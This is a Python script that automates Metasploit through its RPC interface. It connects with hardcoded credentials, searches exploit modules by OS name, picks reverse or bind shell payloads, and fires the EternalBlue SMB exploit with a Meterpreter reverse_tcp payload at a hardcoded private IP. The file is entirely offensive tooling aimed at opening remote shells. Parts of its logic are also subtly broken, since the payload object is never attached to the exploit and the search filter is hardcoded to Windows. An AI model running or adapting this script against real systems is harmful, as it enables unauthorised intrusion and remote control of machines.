from pymetasploit3.msfrpc import MsfRpcClient

def connect_to_metasploit(password='password123', username='msf', port=55553):
    try:
        client = MsfRpcClient(password, username=username, port=port, ssl=False)
        print("[+] Connected to Metasploit\n")
        return client
    except Exception as e:
        print(f"[!] Failed to connect to Metasploit: {e}")
        exit(1)

def search_exploit_for_os(client, os_name):
    """Searches for exploits based on OS name."""
    print(f"üîç Searching for exploits targeting: {os_name}...\n")
    exploits = client.modules.search(os_name)

    found = False
    for module in exploits:
        if module['type'] == 'exploit' and 'windows' in module['fullname'].lower():
            print(f"üì¶ Module: {module['fullname']}")
            found = True

    if not found:
        print(f"‚ùå No exploits found for {os_name}.\n")

def select_payload(client, exploit_name):
    """Selects a payload based on the exploit."""
    print(f"üîç Searching for payloads for exploit: {exploit_name}...\n")

    # Use the exploit to determine what type of payload is compatible
    if 'windows' in exploit_name.lower():
        payloads = [
            'windows/meterpreter/reverse_tcp',
            'windows/shell_reverse_tcp',
            'windows/meterpreter/bind_tcp',
            'windows/shell_bind_tcp'
        ]
    elif 'linux' in exploit_name.lower():
        payloads = [
            'linux/x86/meterpreter/reverse_tcp',
            'linux/x86/shell_reverse_tcp',
            'linux/x86/meterpreter/bind_tcp',
            'linux/x86/shell_bind_tcp'
        ]
    else:
        payloads = [
            'generic/shell_reverse_tcp',  # Default fallback payload
            'generic/shell_bind_tcp'
        ]
    
    if payloads:
        print(f"‚úîÔ∏è Available payloads: {', '.join(payloads)}")
        return payloads[0]  # Select the first available payload
    else:
        print("‚ùå No compatible payloads found.")
        return None

def run_exploit(client, exploit_name, payload_name, target_ip):
    """Run the selected exploit with the chosen payload."""
    print(f"‚ö° Running exploit {exploit_name} with payload {payload_name} on {target_ip}...\n")
    exploit = client.modules.use('exploit', exploit_name)
    payload = client.modules.use('payload', payload_name)

    # Set the target IP and other parameters (adjust as needed)
    exploit['RHOSTS'] = target_ip
    payload['LHOST'] = '0.0.0.0'  # Set this to your listening address if needed
    payload['LPORT'] = 4444  # Common default port for reverse shell payloads

    # Execute the exploit
    exploit.execute()

def main():
    # Connect to Metasploit
    client = connect_to_metasploit()

    # Example of OS detection and exploit search based on OS name
    os_name = "Microsoft Windows 10"  # You can dynamically set this based on scan results
    search_exploit_for_os(client, os_name)

    # Example of selecting an exploit and payload based on the detected OS
    exploit_name = 'exploit/windows/smb/ms17_010_eternalblue'  # Example exploit
    payload_name = select_payload(client, exploit_name)

    # Run the exploit if a payload was selected
    if payload_name:
        target_ip = "192.168.100.73"  # Target IP from your scan
        run_exploit(client, exploit_name, payload_name, target_ip)

if __name__ == '__main__':
    main()

